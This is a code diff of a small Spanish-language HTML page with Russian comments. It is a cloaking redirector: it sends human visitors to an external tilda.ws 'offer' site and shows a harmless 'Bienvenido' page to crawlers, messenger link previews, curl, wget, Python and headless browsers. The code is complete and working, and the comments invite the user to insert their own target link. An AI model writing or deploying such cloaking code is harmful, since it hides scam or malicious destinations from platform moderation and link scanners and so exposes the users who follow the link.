@@ -1,32 +1,35 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Bienvenido</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Redirección</title>
   <script>
-    // Антибот-защита (на примитивном уровне)
-    const isHuman = () => {
-      return navigator.webdriver === false && 
-             window.innerWidth > 800 && 
-             navigator.languages.length > 0;
-    };
+    // ⚠️ Настрой здесь свою целевую ссылку
+    const redirectUrl = "http://argentinaforreal.tilda.ws/";
 
-    const redirect = () => {
-      // Укажи свой оффер ниже:
-      const target = "http://argentinaforreal.tilda.ws/";
-      window.location.href = target;
-    };
+    // Фильтрация по User-Agent
+    const botPatterns = [
+      /bot/i, /crawl/i, /spider/i, /facebook/i, /telegram/i,
+      /whatsapp/i, /discord/i, /preview/i, /python/i,
+      /curl/i, /wget/i, /Headless/i, /Chrome-Lighthouse/i
+    ];
 
-    window.onload = () => {
-      if (isHuman()) {
-        setTimeout(redirect, 1000); // Задержка 1 секунда
-      } else {
-        document.body.innerHTML = "<h1>Acceso restringido</h1>";
-      }
-    };
+    const userAgent = navigator.userAgent;
+    const isBot = botPatterns.some(pattern => pattern.test(userAgent));
+
+    // Проверка на включённый JavaScript и выполнение антибота
+    if (!isBot && typeof navigator.webdriver === "undefined") {
+      // Разрешённый трафик — делаем редирект
+      window.location.href = redirectUrl;
+    } else {
+      // Бот или парсер — останется на белой странице
+      document.write("<h1 style='text-align:center'>Bienvenido</h1>");
+    }
   </script>
 </head>
 <body>
-  <h2 style="text-align:center; margin-top:100px;">Cargando...</h2>
 </body>
 </html>
+
+
